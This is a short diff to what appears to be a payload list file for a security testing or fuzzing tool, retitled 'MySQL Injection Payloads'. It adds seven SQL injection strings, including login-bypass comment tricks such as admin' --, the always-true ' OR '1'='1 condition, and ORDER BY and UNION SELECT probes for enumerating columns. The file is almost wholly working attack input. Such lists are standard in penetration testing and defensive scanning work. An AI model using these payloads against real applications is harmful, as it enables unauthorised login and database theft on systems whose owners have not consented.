@@ -1,2 +1,10 @@
--e # mysql Payload 40
+-e # MySQL Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+admin' --
+admin' #
+admin'/
+' OR '1'='1
+' OR '1'='1' --
+1' ORDER BY 1#
+1' UNION SELECT NULL#
